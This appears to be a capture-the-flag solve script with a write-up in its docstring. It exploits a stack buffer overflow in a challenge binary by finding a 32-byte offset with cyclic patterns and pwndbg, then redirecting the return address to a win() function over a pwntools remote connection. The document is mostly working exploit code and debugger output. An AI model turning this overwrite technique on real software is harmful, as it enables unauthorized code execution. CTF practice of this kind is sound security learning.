"""
This whole comment is about the locally compiled version and not the challenger version, so addresses are different.

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


using cyclic and pwndbg and making a break point at main+161. After using option 2 adding the cyclic 50 characters string, the following was shown in the pwndbg output:

    *RDX  0x61616169
     RDI  0x7fffffffc780 —▸ 0x7ffff7de0034 ◂— 0x192900000000
     RSI  0xa
     R8   0x0
     R9   0x7ffff7f598e0 (_nl_C_LC_CTYPE_class+256) ◂— 0x2000200020002
     R10  0x7ffff7f58fe0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
     R11  0xa
     R12  0x0
     R13  0x7fffffffcdf8 —▸ 0x7fffffffd200 ◂— 'SHELL=/run/current-system/sw/bin/zsh'
     R14  0x7ffff7ffd000 (_rtld_local) —▸ 0x7ffff7ffe2e0 ◂— 0x0
     R15  0x403de0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
     RBP  0x7fffffffccb0 —▸ 0x7fffffffccd0 ◂— 0x1
     RSP  0x7fffffffcca8 —▸ 0x401204 (check_win+25) ◂— nop
    *RIP  0x61616169


these two registers got overwritten:

    *RDX  0x61616169
    *RIP  0x61616169


using python in the console we can find the cyclic string that has overwritten the RDX and RIP:
    >>> print("\x61\x61\x61\x69")
    aaai
    >>>

using the command 'cyclic -l aaai' we get padding which is 29 characters (wrong padding).
If we analyze the source code using ghidra, we will find out that the function 'win()' is never called, and that's the function that prints out the flag contents.
What we need to do in this case is overwrite the RIP and point it to the address of the win function.

After trying again, i found out that the actual padding is different by giving it 'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEAAAABBBBCCCCDDDDFFFFGGGGHHHHJJJJ' we overwrite RIP by '0x42424241' which is 'BBBA', the actual padding is 32 characters.

"""
import pwn

URL:  str = ""
PORT: int = 0

#                               address of the win() function in the original binary address
payload: bytes = (32 * b'E' + b"\xa0\x11\x40\x00")

# connect to the target
target = pwn.remote(URL, PORT)

# chose option 2
target.recvuntil(b"choice:")
target.sendline(b'2')

# send the payload
target.recvuntil(b"buffer:")
target.sendline(payload)
print("Payload sent\n")


# chose option 4
target.recvuntil(b"choice:")
target.sendline(b'4')

# retrieve the output
output: str = target.recvall().decode()\
                              .strip()
print("Flag:" + output)
target.close()
